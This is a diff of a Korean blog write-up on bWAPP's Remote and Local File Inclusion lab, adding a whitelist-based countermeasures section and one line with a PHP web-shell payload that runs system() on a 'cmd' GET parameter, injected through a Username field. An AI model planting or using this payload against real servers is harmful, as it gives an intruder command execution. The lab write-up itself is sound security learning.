@@ -12,15 +12,15 @@ title: "[bWAPP] 7. Missing Functional Level Access Control - Remote & Local File
 
 악의적인 코드가 입력된 파일을 공격자가 서버에 업로드하여 사용자가 열람하는 공격
 
-# RFI(Remote File Inclusion)
-
-공격자가 악성 코드가 있는 원격 서버의 파일을 공격 대상인 웹 애플리케이션 서버에서 실행시켜 취약한 웹 페이지에 악의적인 스크립트를 실행하게 하는 공격
-
 # LFI(Local File Inclusion)
 
 서버 내부에 있는 파일을 확인하는 공격
 
 서버에 접근하는 변수 중 취약한 변수에 상대경로(../)를 사용하여 서버 내부에 접근
+
+# RFI(Remote File Inclusion)
+
+공격자가 악성 코드가 있는 원격 서버의 파일을 공격 대상인 웹 애플리케이션 서버에서 실행시켜 취약한 웹 페이지에 악의적인 스크립트를 실행하게 하는 공격
 
 #  Local File Inclusion (RFI/LFI)
 
@@ -63,6 +63,7 @@ GET 방식으로 HTTP 요청을 사용하는 웹 페이지의 URL에 상대경�
 
 <img src="image-20211101202725707.png" alt="image-20211101202725707" style="zoom:110%;" />
 
+- <?php echo "<script>alert(\"Succeed\")</script>";system($_GET["cmd"]);?>
 - 해당 스크립트 Username에 삽입하여 [insert] 버튼으로 경고창 스크립트 파일(accounts.txt) 생성
 - Download  클릭 시 accounts.txt(공격에 사용될 PHP 파일) 창으로 이동
 
@@ -76,21 +77,32 @@ GET 방식으로 HTTP 요청을 사용하는 웹 페이지의 URL에 상대경�
 
 ![image-20211101211353036](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211101211353036.png)
 
+# 대응방안
 
+## Beebox
 
-### Cross-Site Scripting (XSS) - Stored (Change Secret)
+### Terminal
 
-kali
+<img src="https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211104214538713.png" alt="image-20211104214538713" style="zoom:150%;" />
 
+- 디렉토리 변경
+- vi 편집기로 해당 시나리오 소스 코드 조회
 
+### rlfi.php
 
+![image-20211104215356539](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211104215356539.png)
 
+- Level 확인
 
+### LFI
 
+![image-20211104220754655](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211104220754655.png)
 
+- language 변수에 입력할 내용을 배열로 한정하는 화이트 리스트 방식을 사용
+- 즉, 안전이 증명된 값만을 취함
 
+### RFI
 
+![image-20211104220938080](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20211104220938080.png)
 
-
-
-
+- language 변수에 들어오는 입력 값을 생성한 배열로 검증하기 때문에 RFI 공격에 사용한 cmd 변수나 URL은 입력하지 못함
